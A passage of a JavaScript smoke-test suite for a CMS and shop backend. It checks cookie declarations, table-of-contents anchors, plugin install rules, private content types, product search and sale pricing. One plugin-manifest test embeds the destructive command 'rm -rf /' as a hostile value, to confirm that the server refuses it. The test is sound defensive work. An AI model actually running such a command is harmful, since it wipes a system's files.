    else fail('vendor caveat', String(withGa?.data?.incomplete));

    // The public PAGE and the API must agree — they are one document.
    const page = await (await fetch(`${BASE}/cookies`)).text();
    if (page.includes('_ga') && page.includes('astrobaas_consent')) ok('/cookies renders the same declaration the API returns');
    else fail('/cookies page', 'the page and the API disagree');
    // CSP: an inline style attribute is dropped in production, so a table that
    // relies on one renders wrong with no error anywhere.
    const tableRegion = page.slice(page.indexOf('Cookies this site sets'));
    if (!/\bstyle="/.test(tableRegion.slice(0, 8000))) ok('/cookies uses no inline style attribute');
    else fail('inline style', 'the declaration table would lose its layout under the CSP');

    // --- switching a vendor OFF removes it, with nobody editing anything ----
    await setAnalytics({ analytics_ga4_id: '' });
    const after = await (await fetch(`${BASE}/api/consent/cookies`)).json().catch(() => null);
    if (!(after?.data?.cookies || []).some((c) => c.name === '_ga')) {
      ok('cookie declaration: switching a vendor off removes its rows immediately');
    } else fail('stale declaration', 'GA4 still declared after its id was cleared');

    // A malformed id must not be declared, because it is not LOADED either.
    await setAnalytics({ analytics_ga4_id: 'nonsense' });
    const bad = await (await fetch(`${BASE}/api/consent/cookies`)).json().catch(() => null);
    if (!(bad?.data?.cookies || []).some((c) => c.name === '_ga')) ok('cookie declaration: a malformed tracking id is not declared');
    else fail('malformed id declared', 'declared a cookie the site never sets');
    await setAnalytics({ analytics_ga4_id: '' });

    // --- the insights report ------------------------------------------------
    const rep = await fetch(`${BASE}/admin/insights`, { headers: { Cookie: sessionCookie } });
    const repHtml = await rep.text();
    if (rep.status === 200) ok('insights: the report renders for an admin');
    else fail('insights status', String(rep.status));
    // Charts are SVG because <rect width> is a presentation attribute and
    // survives the CSP; a styled div would not.
    if (/<svg[^>]*viewBox/.test(repHtml)) ok('insights: charts are inline SVG');
    else fail('insights charts', 'no SVG in the report');
    if (!/<rect[^>]+width="NaN"/.test(repHtml)) ok('insights: no NaN reaches a width attribute');
    else fail('insights NaN', 'a NaN width makes the browser drop the whole rect');
    // The honesty requirement, asserted: the traffic half must SAY it has no
    // time axis rather than drawing one from a running counter.
    if (/no record of when each one happened/.test(repHtml)) ok('insights: says plainly that traffic has no time axis');
    else fail('insights honesty', 'the totals-only caveat is missing');

    const anon = await fetch(`${BASE}/admin/insights`, { redirect: 'manual' });
    if (anon.status === 302 || anon.status === 301 || anon.status === 303) ok('insights: anonymous is redirected away');
    else fail('insights access', `expected a redirect, got ${anon.status}`);
  }

  // 8h2b. TABLE OF CONTENTS (C-46): anchors always, the LIST only when asked.
  //
  // The unit tests pin the parser. What they cannot show is that the ids the
  // page publishes and the ids the API serves are the same ones — which is the
  // whole point, because both live shops render `content_rendered` themselves
  // and a #how-it-works link has to work on the storefront and on the CMS.
  if (sessionCookie && csrfToken) {
    const authedJson = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const setToc = (n) => fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authedJson, body: JSON.stringify({ toc_min_headings: n }),
    });

    const body = [
      '<h2>How it works</h2><p>a</p>',
      '<h3>Πώς λειτουργεί</h3><p>b</p>',   // non-Latin: must transliterate, not vanish
      '<h2>Examples</h2><p>c</p>',
      '<h2>Examples</h2><p>d</p>',          // duplicate: must not reuse the same anchor
      '<h1>Not listed</h1><h5>Nor this</h5>',
    ].join('');
    const mk = await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authedJson,
      body: JSON.stringify({ title: 'ToC smoke', status: 'published', content: body }),
    });
    const mkJson = await mk.json().catch(() => null);
    const tocSlug = mkJson?.data?.slug;

    if (tocSlug) {
      // 1. The API carries the anchors, with no setting involved.
      const api = await (await fetch(`${BASE}/api/posts/${tocSlug}`)).json().catch(() => null);
      const rendered = api?.data?.content_rendered || '';
      const apiIds = [...rendered.matchAll(/<h[2-4][^>]*\bid="([^"]+)"/g)].map((m) => m[1]);
      if (apiIds.length === 4) ok('API content_rendered anchors every h2–h4, and only those');
      else fail('api anchors', `got ${apiIds.length} ids: ${apiIds.join(',')}`);
      if (new Set(apiIds).size === apiIds.length) ok('duplicate headings get distinct anchors');
      else fail('anchor collision', apiIds.join(','));
      if (apiIds.every((id) => /^[a-z0-9][a-z0-9-]*$/.test(id))) ok('anchors are bare slugs, Greek included');
      else fail('anchor shape', apiIds.join(','));

      // 2. Off by default: no contents list on the page, anchors still there.
      await setToc(0);
      const off = await (await fetch(`${BASE}/blog/${tocSlug}`)).text();
      if (!/class="[^"]*\bab-toc\b/.test(off)) ok('toc_min_headings=0: no contents list rendered');
      else fail('toc off', 'the block rendered anyway');
      if (/<h2[^>]*\bid="how-it-works"/.test(off)) ok('...but the heading anchors are still published');
      else fail('anchors without toc', 'no id on the h2 when the list is off');

      // 3. On, and every link in it points at a heading that exists. The failure
      //    this catches is a ToC built by a second pass over the html: it looks
      //    perfect and every anchor is off by a suffix.
      await setToc(3);
      const on = await (await fetch(`${BASE}/blog/${tocSlug}`)).text();
      const block = /<details[^>]*\bab-toc\b[\s\S]*?<\/details>/.exec(on);
      if (block) ok('toc_min_headings=3: the contents list renders');
      else fail('toc on', 'no ab-toc block on a post with four headings');
      if (block) {
        const hrefs = [...block[0].matchAll(/href="#([^"]+)"/g)].map((m) => m[1]);
        const bodyIds = new Set([...on.matchAll(/<h[2-4][^>]*\bid="([^"]+)"/g)].map((m) => m[1]));
        const dangling = hrefs.filter((h) => !bodyIds.has(h));
        if (hrefs.length === 4 && dangling.length === 0) ok('every contents link targets a heading on the page');
        else fail('toc anchors', `${hrefs.length} links, dangling: ${dangling.join(',') || 'none'}`);
      }

      // 4. Above the threshold only. A two-heading article gets nothing.
      const short = await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: authedJson,
        body: JSON.stringify({ title: 'ToC smoke short', status: 'published', content: '<h2>One</h2><h2>Two</h2>' }),
      });
      const shortSlug = (await short.json().catch(() => null))?.data?.slug;
      if (shortSlug) {
        const shortHtml = await (await fetch(`${BASE}/blog/${shortSlug}`)).text();
        if (!/class="[^"]*\bab-toc\b/.test(shortHtml)) ok('an article below the threshold gets no contents list');
        else fail('toc threshold', 'rendered on a two-heading post with the threshold at 3');
      }
      await setToc(0);
    } else {
      fail('toc fixture', `could not create the post (status ${mk.status})`);
    }
  }

  // 8h3. DECLARATIVE PLUGINS: install a manifest at runtime and prove each
  // capability takes effect in the SAME process (no restart, no rebuild), then
  // uninstall and prove it is fully gone.
  if (sessionCookie && csrfToken) {
    const hdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const manifest = {
      id: 'smoke-declarative',
      name: 'Smoke Declarative',
      version: '1.0.0',
      description: 'Installed by the smoke test.',
      author: 'smoke',
      astrobaasApi: '^1.0.0',
      capabilities: {
        headTags: [{ tag: 'meta', attrs: { name: 'smoke-declarative', content: 'installed' } }],
        css: '.smoke-declarative{color:rgb(9,9,9)}',
        contentTypes: [
          {
            // No `visibility` — exercises the private DEFAULT.
            name: 'smoke-faq',
            label: 'Smoke FAQ',
            fields: [
              { name: 'question', rule: { type: 'string', min: 1, max: 200 } },
              { name: 'answer', rule: { type: 'string', min: 1, max: 500 } },
            ],
          },
          {
            // Declares itself public — exercises the OPT-IN, which a
            // declarative manifest silently lost between validation and
            // registration until this was covered.
            name: 'smoke-public-faq',
            label: 'Smoke Public FAQ',
            visibility: 'public',
            fields: [
              { name: 'question', rule: { type: 'string', min: 1, max: 200 } },
            ],
          },
        ],
      },
    };

    // Hostile manifests are refused with reasons.
    const bad = await fetch(`${BASE}/api/plugins/install`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ manifest: { ...manifest, id: 'BAD ID', capabilities: { exec: 'rm -rf /' } } }),
    });
    const badJson = await bad.json().catch(() => null);
    if (bad.status === 422 && Array.isArray(badJson?.error?.details?.errors) && badJson.error.details.errors.length >= 2)
      ok('declarative install rejects an invalid manifest with reasons');
    else fail('declarative invalid manifest', `status=${bad.status} ${JSON.stringify(badJson)?.slice(0, 160)}`);

    // A manifest may not shadow a bundled plugin.
    const shadow = await fetch(`${BASE}/api/plugins/install`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ manifest: { ...manifest, id: 'reading-time' } }),
    });
    if (shadow.status === 400) ok('declarative install refuses to shadow a bundled plugin');
    else fail('declarative shadow guard', `expected 400, got ${shadow.status}`);

    // Non-admins cannot install.
    const anonInstall = await fetch(`${BASE}/api/plugins/install`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ manifest }),
    });
    if (anonInstall.status === 401 || anonInstall.status === 403) ok('declarative install is admin-only');
    else fail('declarative install authz', `status=${anonInstall.status}`);

    // Install for real.
    const ins = await fetch(`${BASE}/api/plugins/install`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ manifest, source: 'upload' }),
    });
    const insJson = await ins.json().catch(() => null);
    if (ins.status === 201 && insJson?.data?.id === 'smoke-declarative') ok('declarative plugin installs');
    else fail('declarative install', `status=${ins.status} ${JSON.stringify(insJson)?.slice(0, 160)}`);

    // It shows up in the list, flagged as declarative + removable.
    const listed = await (await fetch(`${BASE}/api/plugins`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
    const entry = (listed?.data || []).find((p) => p.id === 'smoke-declarative');
    if (entry && entry.kind === 'declarative' && entry.removable === true) ok('declarative plugin listed with kind + removable');
    else fail('declarative listing', JSON.stringify(entry || {}).slice(0, 160));

    // Activate → capabilities go live in THIS process (no restart).
    await fetch(`${BASE}/api/plugins/toggle`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ id: 'smoke-declarative', active: true }),
    });

    const homeHtml = await (await fetch(`${BASE}/`)).text();
    if (/<meta[^>]+name="smoke-declarative"[^>]+content="installed"/.test(homeHtml))
      ok('declarative headTags render on the public site');
    else fail('declarative headTags', homeHtml.slice(0, 200));

    const pcss = await (await fetch(`${BASE}/plugins.css`)).text();
    if (/\.smoke-declarative\{color:rgb\(9,9,9\)\}/.test(pcss)) ok('declarative css served via /plugins.css');
    else fail('declarative css', pcss.slice(0, 160));

    // The declared content type is live: generic CRUD works against it.
    const created = await fetch(`${BASE}/api/content/smoke-faq`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ question: 'Does this work?', answer: 'Yes.' }),
    });
    const createdJson = await created.json().catch(() => null);
    if (created.status === 201 && createdJson?.data?.id) ok('declarative contentType accepts a valid record');
    else fail('declarative contentType create', `status=${created.status} ${JSON.stringify(createdJson)?.slice(0, 160)}`);

    // …and its field schema is actually enforced.
    const invalid = await fetch(`${BASE}/api/content/smoke-faq`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ question: '' }),
    });
    if (invalid.status === 422 || invalid.status === 400) ok('declarative contentType enforces its field schema');
    else fail('declarative contentType validation', `expected 4xx, got ${invalid.status}`);

    // --- D2-4: a content type is PRIVATE unless it says otherwise ---
    //
    // Custom collections used to be world-readable with no way to opt out, so
    // a plugin registering "job-application" or "enquiry" published every
    // record at GET /api/content/<name>. The failure was silent and it landed
    // on the author who never considered visibility — i.e. the one most likely
    // to get it wrong.
    //
    // The manifest above declares no `visibility`, so smoke-faq is private.
    // This is the real default path, not a contrived one.
    const faqAnon = await fetch(`${BASE}/api/content/smoke-faq`);
    if (faqAnon.status === 404) ok('D2-4: a type that declares no visibility is not readable anonymously');
    else fail('D2-4 private type leak', `anonymous GET returned ${faqAnon.status}, expected 404`);

    const faqId = createdJson?.data?.id;
    if (faqId) {
      // The entity route must agree with the list route. A collection hidden at
      // /api/content/smoke-faq and readable at /api/content/smoke-faq/<id> is
      // not hidden — it just needs an id, and ids leak.
      const oneAnon = await fetch(`${BASE}/api/content/smoke-faq/${faqId}`);
      if (oneAnon.status === 404) ok('D2-4: the single-entity route applies the same rule as the list');
      else fail('D2-4 entity route leak', `anonymous GET by id returned ${oneAnon.status}, expected 404`);
    }

    // Staff still read it — private means "needs a session", not "unreachable".
    const faqStaff = await fetch(`${BASE}/api/content/smoke-faq`, { headers: hdrs });
    if (faqStaff.status === 200) ok('D2-4: a private type is still readable with a session');
    else fail('D2-4 over-restriction', `authenticated GET returned ${faqStaff.status}, expected 200`);

    // The refusal is 404, not 403: whether a collection EXISTS is itself
    // information. `job-application` answering 403 while `nonsense` answers 404
    // tells an anonymous prober which plugins are installed.
    const unknownType = await fetch(`${BASE}/api/content/no-such-type-at-all`);
    if (unknownType.status === faqAnon.status) ok('D2-4: a private type is indistinguishable from a non-existent one');
    else fail('D2-4 existence oracle', `private=${faqAnon.status} unknown=${unknownType.status} — they must match`);

    // --- the OPT-IN half: a manifest that says `public` must BE public ---
    //
    // The private default is fail-safe, so a broken opt-in leaks nothing — it
    // just makes the feature unusable, silently. A manifest declaring
    // visibility:"public" validated (with a real error path for bad values),
    // installed 201, and registered PRIVATE, because manifestContentTypes()
    // rebuilt the definition from a hand-written field list that omitted it.
    // The author got 404 on their storefront and no error anywhere.
    //
    // Both halves are asserted because they fail independently: the private
    // check above passes whether or not the opt-in works.
    const pubAnon = await fetch(`${BASE}/api/content/smoke-public-faq`);
    if (pubAnon.status === 200) {
      ok('a declarative manifest declaring visibility:"public" IS readable anonymously');
    } else {
      fail('manifest visibility dropped',
        `anonymous GET /api/content/smoke-public-faq returned ${pubAnon.status}, expected 200 — ` +
        'the manifest declared visibility:"public"');
    }

    // Uninstall → gone from the list, and its capabilities stop applying.
    const del = await fetch(`${BASE}/api/plugins/install`, {
      method: 'DELETE',
      headers: hdrs,
      body: JSON.stringify({ id: 'smoke-declarative' }),
    });
    if (del.status === 200) ok('declarative plugin uninstalls');
    else fail('declarative uninstall', `status=${del.status}`);

    const afterHtml = await (await fetch(`${BASE}/`)).text();
    if (!/name="smoke-declarative"/.test(afterHtml)) ok('uninstalled plugin no longer affects rendering');
    else fail('declarative uninstall effect', 'meta tag still present after uninstall');

    // Bundled plugins cannot be uninstalled through this route.
    const delBundled = await fetch(`${BASE}/api/plugins/install`, {
      method: 'DELETE',
      headers: hdrs,
      body: JSON.stringify({ id: 'reading-time' }),
    });
    if (delBundled.status === 400) ok('bundled plugins cannot be uninstalled at runtime');
    else fail('bundled uninstall guard', `expected 400, got ${delBundled.status}`);
  }

  // 8i. Custom content types: activate product-catalog, then CRUD a product
  // through the generic /api/content/<type> endpoints (the "unlimited content"
  // primitive end-to-end).
  if (sessionCookie && csrfToken) {
    const hdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    // Before activation the type is unknown -> 404.
    const pre = await fetch(`${BASE}/api/content/catalog-item`);
    if (pre.status === 404) ok('custom type 404s before its plugin is active');
    else fail('custom type pre-activation', `expected 404, got ${pre.status}`);

    await fetch(`${BASE}/api/plugins/toggle`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ id: 'product-catalog', active: true }),
    });

    // Create a product (validated against the registered field schema).
    const created = await fetch(`${BASE}/api/content/catalog-item`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ name: 'Widget', price: 9.99, sku: 'W-1', in_stock: true }),
    });
    const cj = await created.json().catch(() => null);
    const pid = cj?.data?.id;
    if (created.status === 201 && pid && cj.data.data.name === 'Widget') ok('POST /api/content/catalog-item creates a custom entity');
    else fail('custom create', `status=${created.status} ${JSON.stringify(cj)}`);

    // Schema validation rejects a bad payload (price must be a number).
    const bad = await fetch(`${BASE}/api/content/catalog-item`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ name: 'NoPrice', price: 'free' }),
    });
    if (bad.status === 422) ok('custom create enforces the field schema (422)');
    else fail('custom validation', `expected 422, got ${bad.status}`);

    // List (public read).
    const list = await fetch(`${BASE}/api/content/catalog-item`);
    const lj = await list.json().catch(() => null);
    if (list.status === 200 && Array.isArray(lj?.data) && lj.data.some((e) => e.id === pid)) ok('GET /api/content/catalog-item lists entities');
    else fail('custom list', JSON.stringify(lj));

    // Fetch ONE entity by id (public read, same policy as the list).
    if (pid) {
      const one = await fetch(`${BASE}/api/content/catalog-item/${pid}`);
      const oj = await one.json().catch(() => null);
      if (one.status === 200 && oj?.data?.id === pid) ok('GET /api/content/catalog-item/:id returns one entity');
      else fail('custom entity get', `status=${one.status}`);

      const missing = await fetch(`${BASE}/api/content/catalog-item/does-not-exist`);
      if (missing.status === 404) ok('unknown entity id 404s');
      else fail('custom entity 404', `status=${missing.status}`);

      const badType = await fetch(`${BASE}/api/content/not-a-type/${pid}`);
      if (badType.status === 404) ok('unregistered content type 404s (no raw storage access)');
      else fail('custom entity bad type', `status=${badType.status}`);
    }

    // Update + delete.
    if (pid) {
      const upd = await fetch(`${BASE}/api/content/catalog-item/${pid}`, {
        method: 'PUT',
        headers: hdrs,
        body: JSON.stringify({ price: 12.5 }),
      });
      const uj = await upd.json().catch(() => null);
      if (upd.status === 200 && uj?.data?.data?.price === 12.5) ok('PUT /api/content/catalog-item/:id updates an entity');
      else fail('custom update', `status=${upd.status} ${JSON.stringify(uj)}`);

      const del = await fetch(`${BASE}/api/content/catalog-item/${pid}`, { method: 'DELETE', headers: hdrs });
      if (del.status === 200) ok('DELETE /api/content/catalog-item/:id removes an entity');
      else fail('custom delete', `status=${del.status}`);
    }

    await fetch(`${BASE}/api/plugins/toggle`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ id: 'product-catalog', active: false }),
    });
  }

  // 8j. COMMERCE: catalogue, checkout, stock integrity.
  // The checkout path handles money and inventory, so it gets the same
  // treatment as auth: prove the guarantees, don't assume them.
  if (sessionCookie && csrfToken) {
    const ch = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const mkProduct = (body) =>
      fetch(`${BASE}/api/products`, { method: 'POST', headers: ch, body: JSON.stringify(body) });

    // --- catalogue basics ---
    const pRes = await mkProduct({ name: 'Smoke Widget', slug: 'smoke-widget', price_cents: 1500, stock: 4 });
    const pJson = await pRes.json().catch(() => null);
    const productId = pJson?.data?.id;
    if (pRes.status === 201 && productId && pJson.data.price_cents === 1500) ok('POST /api/products creates a product');
    else fail('product create', `status=${pRes.status} ${JSON.stringify(pJson)?.slice(0, 140)}`);

    const anonCreate = await fetch(`${BASE}/api/products`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'Nope', slug: 'nope', price_cents: 1 }),
    });
    if (anonCreate.status === 401 || anonCreate.status === 403) ok('product create is staff-only');
    else fail('product authz', `status=${anonCreate.status}`);

    // --- brands: a published slug leads back to its brand, on every driver ---
    // GET /api/brands published slugify(name) while ?brand= re-folded the slug;
    // slugify transliterates and the filter's key does not, so a brand with ß,
    // a Greek name, or a curated slug of its own choosing was listed with a
    // count and returned NOTHING. Also covered in tests/brand.test.mjs; checked
    // here because this file runs on all three storage drivers.
    {
      const probes = [
        'Smoke Straße', 'Smoke Straße', 'Γυαλιά Όψη Smoke', 'Smoke Rayban', 'SMOKE RAYBAN',
        // Two makers that slugify alike (both `smoke-opsi`).
        'Smoke Όψη', 'Smoke Opsi', 'Smoke Opsi',
        // The shape older WooCommerce imports left behind: the products carry
        // the SLUG. The importer now stores names (tests/woo-apply.test.mjs).
        'smoke-optics', 'smoke-optics',
      ];
      for (const [i, brand] of probes.entries()) {
        await mkProduct({ name: `Brand probe ${i}`, slug: `brand-probe-${i}`, price_cents: 900, stock: 3, status: 'active', brand });
      }
      const curate = (body) => fetch(`${BASE}/api/brands`, { method: 'POST', headers: ch, body: JSON.stringify(body) });
      const curatedRes = await curate({ name: 'Smoke Ray-Ban', slug: 'smk-rb' });
      if (curatedRes.status === 201) ok('brands: a curated brand keeps a slug of its own choosing');
      else fail('curated brand create', `status=${curatedRes.status}`);
      const wooRes = await curate({ name: 'Smoke Όψη Optics', slug: 'smoke-optics' });
      if (wooRes.status === 201) ok('brands: a curated record may describe the products its slug names');
      else fail('importer-shaped brand create', `status=${wooRes.status}`);

      const listed = (await (await fetch(`${BASE}/api/brands`)).json().catch(() => null))?.data ?? [];
      const slugOf = (key) => listed.find((b) => b.key === key)?.slug;
      const totalFor = async (slug) =>
        (await (await fetch(`${BASE}/api/products?brand=${encodeURIComponent(slug)}&limit=1`)).json().catch(() => null))?.meta?.total;
      for (const [key, slug, n] of [['smokestraße', 'smoke-strasse', 2], ['γυαλιαοψηsmoke', 'gyalia-opsi-smoke', 1], ['smokerayban', 'smk-rb', 2], ['smokeopsi', 'smoke-opsi', 2], ['smokeoptics', 'smoke-optics', 2]]) {
        const t = slugOf(key) === slug ? await totalFor(slug) : undefined;
        if (t === n) ok(`brands: ?brand=${slug} returns its ${n}, the slug /api/brands publishes`);
        else fail(`brand slug ${slug}`, `listed slug=${slugOf(key)} filtered total=${t}`);
      }
      // The maker the shared slug does NOT spell publishes a suffixed one.
      const greekSlug = slugOf('smokeοψη') ?? '';
      if (/^smoke-opsi-[a-z0-9]+$/.test(greekSlug) && await totalFor(greekSlug) === 1) ok('brands: a clashing maker gets its own suffixed slug, and it leads to its products');
      else fail('clashing brand slug', `slug=${greekSlug}`);
      const woo = listed.find((b) => b.key === 'smokeoptics');
      if (woo?.curated === true && woo?.name === 'Smoke Όψη Optics' && woo?.count === 2) ok('brands: the importer-shaped record and its products are ONE entry');
      else fail('importer-shaped brand', JSON.stringify(woo)?.slice(0, 200));
      const broken = [];
      for (const b of listed) {
        const t = await totalFor(b.slug);
        if (t !== b.count) broken.push(`${b.name} (${b.slug}) count=${b.count} filtered=${t}`);
      }
      if (listed.length && !broken.length) ok(`brands: for all ${listed.length} listed brands, ?brand=<slug> returns exactly its count`);
      else fail('brand count invariant', broken.join('; ').slice(0, 300) || 'no brands listed');
      if (listed.length && new Set(listed.map((b) => b.slug)).size === listed.length) ok('brands: every published slug is unique');
      else fail('brand slugs unique', listed.map((b) => b.slug).join(',').slice(0, 300));
    }

    const pub = await (await fetch(`${BASE}/api/products`)).json().catch(() => null);
    // The single-product response carries a ready-to-EMBED schema.org document
    // for whichever storefront renders the page — a shape a consumer copies
    // into a <script> verbatim, so without @context it is a fragment every
    // validator ignores. Asserted HERE, where a product provably exists: the
    // first version of this sat where the catalogue was still empty and
    // skipped itself silently.
    if (productId) {
      const one = await (await fetch(`${BASE}/api/products/${productId}`)).json();
      const ld = one?.meta?.jsonld;
      const node = ld?.['@graph']?.[0];
      if (ld?.['@context'] === 'https://schema.org' && node?.['@type'] === 'Product' && node.name) {
        ok('a product answers with an embeddable schema.org document');
      } else fail('product jsonld', JSON.stringify(ld)?.slice(0, 160));
      if (node?.offers && typeof node.offers.price === 'string' && /^\d+\.\d{2}$/.test(node.offers.price)) {
        ok('...with money as a schema.org decimal string, not cents');
      } else fail('product jsonld price', JSON.stringify(node?.offers));
    } else fail('product jsonld setup', 'no product id to check');

    if (Array.isArray(pub?.data) && pub.data.some((p) => p.id === productId)) ok('GET /api/products is public');
    else fail('public catalogue', JSON.stringify(pub)?.slice(0, 120));

    const bySlug = await (await fetch(`${BASE}/api/products/smoke-widget`)).json().catch(() => null);
    if (bySlug?.data?.id === productId) ok('GET /api/products/<slug> resolves by slug');
    else fail('product by slug', JSON.stringify(bySlug)?.slice(0, 120));

    // A draft product must not be publicly readable.
    const draft = await (await mkProduct({ name: 'Hidden', slug: 'hidden-draft', price_cents: 999, status: 'draft' })).json().catch(() => null);
    const hidden = await fetch(`${BASE}/api/products/hidden-draft`);
    if (hidden.status === 404) ok('draft products are not publicly readable');
    else fail('draft leak', `status=${hidden.status}`);

    // --- slug uniqueness (regression: was only enforced on create) ---
    if (draft?.data?.id) {
      const dupe = await fetch(`${BASE}/api/products/${draft.data.id}`, {
        method: 'PUT', headers: ch, body: JSON.stringify({ slug: 'smoke-widget' }),
      });
      if (dupe.status === 400) ok('duplicate slug rejected on UPDATE');
      else fail('slug uniqueness on update', `expected 400, got ${dupe.status}`);

      const same = await fetch(`${BASE}/api/products/${draft.data.id}`, {
        method: 'PUT', headers: ch, body: JSON.stringify({ slug: 'hidden-draft', name: 'Hidden v2' }),
      });
      if (same.status === 200) ok('a product can keep its OWN slug on update');
      else fail('self slug update', `status=${same.status}`);
    }

    // --- featured/position are settable via the API (not import-only) ---
    if (productId) {
      const feat = await fetch(`${BASE}/api/products/${productId}`, {
        method: 'PUT', headers: ch, body: JSON.stringify({ featured: true, position: 3 }),
      });
      const fj = await feat.json().catch(() => null);
      if (feat.status === 200 && fj?.data?.featured === true && fj.data.position === 3) ok('featured/position settable via the product API');
      else fail('featured/position update', JSON.stringify(fj?.data)?.slice(0, 140));

      // --- accent-insensitive search (reported from a live Greek shop) ---
      // A shopper types what is on their keyboard: capitals carry no accents in
      // Greek, and many people omit them entirely. All four spellings below are
      // the SAME word and must all find the product.
      {
        const gr = await (await mkProduct({
          name: 'Αλυσίδα Ατσάλι Ηλίου', slug: 'smoke-alysida', price_cents: 1500, stock: 5,
          gtin: '4006381333931', tags: ['ΓΥΑΛΙΑ'],
        })).json().catch(() => null);
        const grId = gr?.data?.id;

        const found = async (q) => {
          const r = await (await fetch(`${BASE}/api/products?search=${encodeURIComponent(q)}`)).json().catch(() => null);
          return (r?.data || []).some((p) => p.id === grId);
        };

        for (const q of ['Αλυσίδα', 'αλυσιδα', 'ΑΛΥΣΙΔΑ', 'ΑΛΥΣΊΔΑ']) {
          if (await found(q)) ok(`product search finds Greek "${q}" regardless of accents/case`);
          else fail('accent search', `"${q}" did not match "Αλυσίδα Ατσάλι Ηλίου"`);
        }
        // Final sigma: 'ΗΛΙΟΣ'.toLowerCase() produces ς, which must still match.
        if (await found('ηλιου')) ok('product search folds Greek sigma/accents mid-phrase');
        else fail('accent search', '"ηλιου" did not match "…Ηλίου"');

        if (await found('4006381333931')) ok('product search matches a GTIN barcode');
        else fail('gtin search', 'barcode did not match');
        if (await found('γυαλια')) ok('product search matches a tag, accent-folded');
        else fail('tag search', 'tag did not match');
        if (!(await found('ζζζζζ'))) ok('search still excludes non-matches');
        else fail('over-match', 'unrelated query matched');

        // A Greek name with NO explicit slug must not produce an empty slug —
        // an empty slug skips the uniqueness check and is unreachable by URL.
        const noSlug = await (await fetch(`${BASE}/api/products`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({ name: 'Γυαλιά Ηλίου Πολωτικά', price_cents: 999 }),
        })).json().catch(() => null);
        const slug = noSlug?.data?.slug;
        if (slug && slug.length > 0) ok(`a Greek name yields a real slug (${slug})`);
        else fail('EMPTY SLUG', `Greek product got slug=${JSON.stringify(slug)}`);
        if (/^[a-z0-9-]+$/.test(slug || '')) ok('the generated slug is URL-safe ASCII');
        else fail('slug charset', slug);
        // And it must be reachable by that slug.
        const bySlug = await fetch(`${BASE}/api/products/${encodeURIComponent(slug || 'x')}`);
        if (bySlug.status === 200) ok('the Greek product is reachable by its generated slug');
        else fail('slug lookup', `status=${bySlug.status}`);
      }

      const onlyFeatured = await (await fetch(`${BASE}/api/products?featured=true`)).json().catch(() => null);
      if ((onlyFeatured?.data || []).every((p) => p.featured === true)) ok('?featured=true filters the catalogue');
      else fail('featured filter', 'non-featured product returned');
    }

    // --- `on_sale` is DERIVED on the API write path, not just on import ---
    //
    // It was documented as server-derived and derived nowhere except the CSV
    // importer, so a product priced through the admin or the REST API stored
    // `on_sale: false` forever. The storefront reads that flag for the
    // strikethrough and the sale badge, and `?on_sale=true` backs the shop's
    // discount listing — so a manager could discount the whole catalogue and no
    // shopper would see a single price drop. Nothing errored.
    //
    // Driven over HTTP because the bug was invisible at every other level: the
    // rule existed and was unit-tested, it simply was not called.
    {
      const saleBody = {
        name: 'Smoke Sale Item', slug: 'smoke-sale-item',
        price_cents: 12900, regular_price_cents: 15900, sale_price_cents: 12900,
      };
      const made = await (await fetch(`${BASE}/api/products`, {
        method: 'POST', headers: ch, body: JSON.stringify(saleBody),
      })).json().catch(() => null);
      const saleId = made?.data?.id;
      if (made?.data?.on_sale === true && made.data.price_cents === 12900) {
        ok('creating a product with a genuine discount marks it on sale');
      } else {
        fail('on_sale on create', `on_sale=${made?.data?.on_sale} price=${made?.data?.price_cents}`);
      }

      if (saleId) {
        // A PARTIAL update — only the sale price — must recompute against the
        // STORED regular price. This is how the admin form and most clients save.
        const cheaper = await (await fetch(`${BASE}/api/products/${saleId}`, {
          method: 'PUT', headers: ch, body: JSON.stringify({ sale_price_cents: 11900 }),
        })).json().catch(() => null);
        if (cheaper?.data?.on_sale === true && cheaper.data.price_cents === 11900) {
          ok('a partial PUT of only sale_price_cents recomputes against stored values');
        } else {
          fail('on_sale on partial update', `on_sale=${cheaper?.data?.on_sale} price=${cheaper?.data?.price_cents}`);
        }

        // The listing that backs the shop's discount page.
        const saleList = await (await fetch(`${BASE}/api/products?on_sale=true`)).json().catch(() => null);
        const ids = (saleList?.data || []).map((p) => p.id);
        if (ids.includes(saleId) && (saleList?.data || []).every((p) => p.on_sale === true)) {
          ok('?on_sale=true returns exactly the on-sale products');
        } else {
          fail('on_sale filter', `sale product ${ids.includes(saleId) ? 'present' : 'MISSING'} in ${JSON.stringify(ids)}`);
        }

        // Removing the promotion has to actually remove it, price included.
        const ended = await (await fetch(`${BASE}/api/products/${saleId}`, {
          method: 'PUT', headers: ch, body: JSON.stringify({ sale_price_cents: null }),
        })).json().catch(() => null);
        if (ended?.data?.on_sale === false && ended.data.price_cents === 15900) {
          ok('clearing the sale price ends the sale and restores the regular price');
        } else {
          fail('sale not cleared', `on_sale=${ended?.data?.on_sale} price=${ended?.data?.price_cents}`);
        }

        // A "sale" that costs more must never be advertised.
        const dearer = await (await fetch(`${BASE}/api/products/${saleId}`, {
